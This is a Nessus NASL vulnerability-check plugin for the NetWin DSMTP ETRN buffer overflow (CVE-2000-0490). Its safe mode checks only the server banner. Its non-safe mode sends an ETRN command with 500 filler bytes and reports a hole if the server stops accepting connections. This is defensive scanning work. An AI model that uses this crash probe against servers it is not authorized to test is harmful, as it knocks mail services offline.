#
# (C) Tenable Network Security, Inc.
#


include("compat.inc");


if(description)
{
 script_id(10438);
 script_version ("$Revision: 1.25 $");
 script_cve_id("CVE-2000-0490");
 script_bugtraq_id(1297);
 script_xref(name:"OSVDB", value:"340");

 script_name(english:"NetWin DSMTP (Dmail) ETRN Command Overflow");
 script_summary(english:"Checks if the remote mail server is vulnerable to a ETRN overflow"); 
 
 script_set_attribute(
   attribute:"synopsis",
   value:"The remote SMTP server has a buffer overflow vulnerability."
 );
 script_set_attribute(
   attribute:"description", 
   value:string(
     "The remote SMTP server is vulnerable to a buffer overflow when the\n",
     "ETRN command is issued arguments which are too long.  A remote\n",
     "attacker could exploit this to crash the SMTP server, or possibly\n",
     "execute arbitrary code."
   )
 );
 script_set_attribute(
   attribute:"see_also",
   value:"http://archives.neohapsis.com/archives/bugtraq/2000-05/0407.html"
 );
 script_set_attribute(
   attribute:"solution", 
   value:
     string(
       "Upgrade to the latest version of the SMTP server.  If you are using\n",
       "NetWin DSMTP, upgrade to version 2.7r or later."
     )
 );
 script_set_attribute(
   attribute:"cvss_vector", 
   value:"CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C"
 );
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK); # mixed
 script_family(english:"SMTP problems");

 script_copyright(english:"This script is Copyright (C) 2000-2009 Tenable Network Security, Inc.");

 script_dependencie("smtpserver_detect.nasl", "sendmail_expn.nasl");
 script_exclude_keys("SMTP/wrapped");
 script_require_ports("Services/smtp", 25);

 exit(0);
}

#
# The script code starts here
#

include("global_settings.inc");
include("smtp_func.inc");

if (report_paranoia < 2) exit(0);

port = get_kb_item("Services/smtp");
if(!port)port = 25;
if (get_kb_item('SMTP/'+port+'/broken')) exit(0);

if(safe_checks())
{
 banner = get_smtp_banner(port:port);
 
 if(banner)
 {
  if("2.7r" >< banner)exit(0);
  
  if(egrep(string:banner,
  	  pattern:"^220.*DSMTP ESMTP Server v2\.([0-7]q*|8[a-h]).*"))
	  {
	 security_hole(port, extra:'\nNessus only checked the SMTP banner.\n');
 	}
 }
  exit(0);
}


if(get_port_state(port))
{
 soc = open_sock_tcp(port);
 if(soc)
 {
 data = smtp_recv_banner(socket:soc);     
 crp = string("HELO example.com\r\n");
 send(socket:soc, data:crp);
 data = recv_line(socket:soc, length:1024);
 crp = string("ETRN ", crap(500), "\r\n");
 send(socket:soc, data:crp);
 send(socket:soc, data:string("QUIT\r\n"));
 close(soc);

 soc2 = open_sock_tcp(port);
 if(!soc2)security_hole(port, extra:'\nNessus crashed the SMTP server.\n');
 else close(soc2);
 }
}
